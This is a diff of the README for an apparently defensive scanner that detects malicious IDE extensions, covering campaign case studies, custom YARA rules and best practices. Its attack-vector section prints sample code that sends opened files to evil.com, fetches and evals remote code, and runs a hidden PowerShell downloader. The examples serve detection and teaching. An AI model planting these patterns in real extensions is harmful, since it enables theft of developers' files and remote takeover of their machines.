@@ -23,37 +23,40 @@ Info finding: -1 point
 Detection by Category
 The scanner automatically categorizes extensions and adjusts expectations:
 
-Category	Examples	Expected Behaviors
-AI Assistant	Copilot, Codeium, Kilo Code	Network, process spawn, env access
-Language Support	ms-python, rust-analyzer, Go	Process spawn, dynamic require
-Developer Tools	Code Runner, REST Client, Live Server	Process spawn, network requests
-Remote Development	Remote-SSH, Dev Containers, WSL	SSH, network, process spawn
-Testing	Jest Runner, Test Explorer	Process spawn
-Notebook	Jupyter	Kernel spawn, network
-Debugger	Node Debug, Python Debug	Process spawn
-Linter	ESLint, Prettier	Process spawn
-SCM	GitLens, Git Graph	Git credentials access
-Theme	Color themes, icon themes	Minimal runtime
-🎯 Real-World Attack Prevention
+|Category|Examples|Expected Behaviors|
+|--|--|--|
+|AI Assistant|Copilot, Codeium, Kilo Code|Network, process spawn, env access|
+|Language Support|ms-python, rust-analyzer, Go|Process spawn, dynamic require|
+|Developer Tools|Code Runner, REST Client, Live Server|Process spawn, network requests|
+|Remote Development|Remote-SSH, Dev Containers, WSL|SSH, network, process spawn|
+|Testing|Jest Runner, Test Explorer|Process spawn|
+|Notebook|Jupyter|Kernel spawn, network|
+|Debugger|Node Debug, Python Debug|Process spawn|
+|Linter|ESLint, Prettier|Process spawn|
+|SCM|GitLens, Git Graph|Git credentials access|
+|Theme|Color themes, icon themes|Minimal runtime|
+
+**Real-World Attack Prevention**
+
 Case Study 1: MaliciousCorgi Campaign
 The scanner detected MaliciousCorgi (1.5M installs) by identifying:
+- Hidden iframe: Zero-pixel iframe loading analytics SDKs
+- File exfiltration: onDidOpenTextDocument reading entire files
+- Base64 encoding: File contents encoded before transmission
+- Remote command: getFilesList harvesting up to 50 files
+- Analytics SDKs: Zhuge.io, GrowingIO, TalkingData, Baidu Analytics
+- Domain blocklist: aihao123.cn
 
-Hidden iframe: Zero-pixel iframe loading analytics SDKs
-File exfiltration: onDidOpenTextDocument reading entire files
-Base64 encoding: File contents encoded before transmission
-Remote command: getFilesList harvesting up to 50 files
-Analytics SDKs: Zhuge.io, GrowingIO, TalkingData, Baidu Analytics
-Domain blocklist: aihao123.cn
 Case Study 2: Fake ClawdBot Trojan
 Detected by flagging:
+- Startup activation: onStartupFinished in manifest
+- Dynamic fetch: Downloading from C2 server on activation
+- ScreenConnect RAT: Known remote access tool signature
+- Triple fallback: Multiple delivery mechanisms
+- Process execution: child_process.exec() patterns
+- Hidden batch script: PowerShell downloader fallback
 
-Startup activation: onStartupFinished in manifest
-Dynamic fetch: Downloading from C2 server on activation
-ScreenConnect RAT: Known remote access tool signature
-Triple fallback: Multiple delivery mechanisms
-Process execution: child_process.exec() patterns
-Hidden batch script: PowerShell downloader fallback
-🛠️ Extending the Scanner
+**Extending the Scanner**
 Adding Custom YARA Rules
 Create custom_rules.yar:
 
@@ -68,6 +71,7 @@ rule custom_exfil_detection {
     condition:
         any of them
 }
+
 Run with custom rules:
 
 ai-plugin-scanner scan --yara-rules ./custom_rules.yar extension.vsix
@@ -84,8 +88,9 @@ console.log(jsonReporter.generate(report));
 // Generate SARIF report
 const sarifReporter = new SarifReporter();
 console.log(sarifReporter.generate(report));
-📚 Understanding Attack Vectors
-1. Permission Abuse
+
+**Understanding Attack Vectors**
+**1. Permission Abuse**
 Extensions request permissions beyond their needs:
 
 {
@@ -100,7 +105,7 @@ Extensions request permissions beyond their needs:
 }
 A theme extension should not have a main entry point or wildcard activation.
 
-2. Obfuscated Code
+**2. Obfuscated Code**
 Malicious code often uses obfuscation:
 
 const _0x4b4334 = _0x41e2;
@@ -112,7 +117,8 @@ const _0x4b4334 = _0x41e2;
     };
     // ...obfuscated malicious payload
 })();
-3. Data Exfiltration
+
+**3. Data Exfiltration**
 Extensions sending data to external servers:
 
 const vscode = require('vscode');
@@ -124,7 +130,8 @@ function activate(context) {
         https.post('https://evil.com/exfil', { data });
     });
 }
-4. Remote Code Execution
+
+**4. Remote Code Execution**
 Dynamic code execution from external sources:
 
 const https = require('https');
@@ -136,7 +143,7 @@ function activate(context) {
         res.on('end', () => eval(code));
     });
 }
-5. Process Spawning
+**5. Process Spawning**
 Launching external processes:
 
 const { exec } = require('child_process');
@@ -145,24 +152,27 @@ function activate(context) {
     exec('powershell -WindowStyle Hidden -Command "irm https://evil.com/script | iex"', 
          { windowsHide: true });
 }
-🔐 Best Practices
+
+**Best Practices**
 For Developers
-Verify publishers: Check for verified badges and established reputation
-Review permissions: Extensions should request minimal necessary permissions
-Inspect source code: Check GitHub repository for transparency
-Check dependencies: Review package.json for suspicious dependencies
-Monitor updates: Be cautious of sudden permission changes
-Use sandboxed environments: Test extensions in isolated containers
-Rotate credentials: After removing suspicious extensions
+* Verify publishers: Check for verified badges and established reputation
+* Review permissions: Extensions should request minimal necessary permissions
+* Inspect source code: Check GitHub repository for transparency
+* Check dependencies: Review package.json for suspicious dependencies
+* Monitor updates: Be cautious of sudden permission changes
+* Use sandboxed environments: Test extensions in isolated containers
+* Rotate credentials: After removing suspicious extensions
 For Organizations
-Implement allowlists: Restrict to vetted publishers
-Regular audits: Weekly extension registry scans
-Network monitoring: Block outbound traffic to malicious domains
-Endpoint detection: EDR solutions for file system monitoring
-Educate developers: Security training for extension hygiene
-Log installations: Centralized tracking for incident response
-CI/CD integration: Automated scanning in build pipelines
-🧪 Testing
+* Implement allowlists: Restrict to vetted publishers
+* Regular audits: Weekly extension registry scans
+* Network monitoring: Block outbound traffic to malicious domains
+* Endpoint detection: EDR solutions for file system monitoring
+* Educate developers: Security training for extension hygiene
+* Log installations: Centralized tracking for incident response
+* CI/CD integration: Automated scanning in build pipelines
+
+
+**Testing**
 # Run test suite
 npm test
 
@@ -177,19 +187,21 @@ npm run test:integration
 🤝 Contributing
 We welcome contributions! Please see CONTRIBUTING.md [blocked] for details.
 
-Areas for Contribution
-Additional YARA rules for new malware campaigns
-Support for more IDE marketplaces (JetBrains, Eclipse, etc.)
-Enhanced obfuscation detection algorithms
-Behavioral analysis heuristics
-Performance optimizations
-Documentation and examples
-Adding New IOC Sources
-Create iocs/campaigns/new-campaign.json
-Follow the schema in iocs/schema.json
-Run npm run validate-iocs
-Submit PR with attribution
-📖 Threat Intelligence Sources
+**Areas for Contribution**
+* Additional YARA rules for new malware campaigns
+* Support for more IDE marketplaces (JetBrains, Eclipse, etc.)
+* Enhanced obfuscation detection algorithms
+* Behavioral analysis heuristics
+* Performance optimizations
+* Documentation and examples
+* Adding New IOC Sources
+* Create iocs/campaigns/new-campaign.json
+* Follow the schema in iocs/schema.json
+* Run npm run validate-iocs
+* Submit PR with attribution
+
+
+**Threat Intelligence Sources**
 IOCs compiled from public research:
 
 GlassWorm campaign
@@ -206,22 +218,19 @@ SoliditySquatters
 MaliciousCorgi (1.5M installs)
 Fake ClawdBot Trojan
 ReversingLabs Dec 2025 campaign
-📋 Related Tools
+
+
+**Related Tools**
 vsix-audit - Trail of Bits VS Code extension scanner
+https://github.com/trailofbits/vsix-audit
 IDE-SHEPHERD - Datadog's real-time IDE monitoring
+https://github.com/DataDog/IDE-Shepherd-extension
 extension-guard - Multi-IDE security scanner
+https://microsoftedge.microsoft.com/addons/detail/extension-guard/gpghlcmpelienkpbhcjknneohejkpgpg
 Spectra Assure - ReversingLabs marketplace scanner
+https://www.reversinglabs.com/products/software-supply-chain-security
 VSCan - Web-based extension analyzer
-📄 License
-MIT License
-
-Copyright (c) 2026 [Your Name]
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+https://vscan.dev/
 
 🙏 Acknowledgments
 This project builds upon excellent research and tools from:
